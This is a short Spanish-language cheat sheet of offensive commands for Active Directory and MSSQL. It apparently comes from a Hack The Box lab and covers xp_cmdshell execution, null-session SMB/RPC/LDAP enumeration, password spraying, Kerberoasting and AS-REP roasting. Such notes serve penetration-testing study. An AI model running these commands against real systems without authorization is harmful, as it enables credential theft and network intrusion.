
# Microsoft SQL

Información general [[Mssql MicrosoftSQL]]

### Ejecución de comandos

Para esto podemos usar xp_cmdshell (Permiso RARO)

```ruby
xp_cmdshell whoami
```


# Sin Credenciales

### Buscar  SMB Null Session

```python
netexec smb {IP} --shares
```

### RPC client Null session

```python
rpcclient -U "" {IP_DC} -N 
```

### LDAP Null Session

```python
ldapsearch -H ldap://{DOMINIO} -x -s base namingcontexts
```


```python
sudo ldapsearch -H ldap://10.129.51.75 -x -b "DC=support,DC=htb" | grep -E "info|description|comment"
```

### Enumerar recursos SMB

```python
smbmap -H {IP_DC} -u 'cualquiercosa'
```

```python
smbmap -H {IP_DC} -u 'cualquiercosa' -r 'recurso'
```


# Con Credenciales

### Service Accounts

***svc_sql***: Buscar credenciales en registros de errores de SQL `C:\Program Files\Microsoft SQL Server\MSSQL<NN>.<INSTANCIA>\MSSQL\`.

### Credenciales reutilizadas

```ruby
sudo netexec smb {IP} -u usuarios.txt -p {PASSWORD} --continue-on-success
```

### Kerberoasting 

```ruby
GetUserSPNs.py '{DOMINIO}/{USUARIO}:{PASSWORD}' 
```

### ASREP Roasting

```ruby
GetNPUsers.py -no-pass -usersfile {Users.txt} {DOMINIO}/ -dc-ip {IP}
```

## Descripciones y usuarios

```ruby
sudo netexec smb {IP} -u {USUARIO} -p {PASSWORD} --users
```





